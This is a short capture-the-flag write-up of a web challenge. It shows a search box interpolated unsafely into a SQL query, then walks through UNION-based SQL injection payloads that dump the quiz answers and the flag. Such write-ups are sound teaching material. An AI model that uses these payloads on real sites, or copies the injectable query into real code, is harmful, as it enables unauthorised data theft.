# Secure Quiz Label Index

category: web

> Halogen has just released all the questions to the next CyberSecurity test. Blahaj wants to score full marks, and believes the answers and bonus questions are listed somewhere on the site. Help Blahaj get the answers and score full marks on this quiz!

From just a little testing (or just reading the source code provided), we see that our "search" gets injected into a SQL query:
```py
f"SELECT ID, question, setter FROM quizzes WHERE question LIKE '%{query}%' AND visible = 1"
```

We can escape the single quotes `'`, so we can use a SQL UNION injection (where we UNION the SQL query with another query to query what we want) as such:

payload: `' UNION SELECT ID, question, answer from quizzes`
```sql
SELECT ID, question, setter FROM quizzes WHERE question LIKE '%' UNION SELECT ID, question, answer from quizzes %' AND visible = 1
```

However this is not a valid SQL query, so I appended yet another query to make it valid:

payload: `' UNION SELECT ID, question, answer from quizzes UNION SELECT ID, question, setter FROM quizzes WHERE question LIKE '`
```sql
SELECT ID, question, setter FROM quizzes WHERE question LIKE '%' UNION SELECT ID, question, answer from quizzes UNION SELECT ID, question, setter FROM quizzes WHERE question LIKE '%' AND visible = 1
```

and we get the answer to the "What is the flag?" question to be `blahaj{full_m4rk5_guar4nte3d!!}`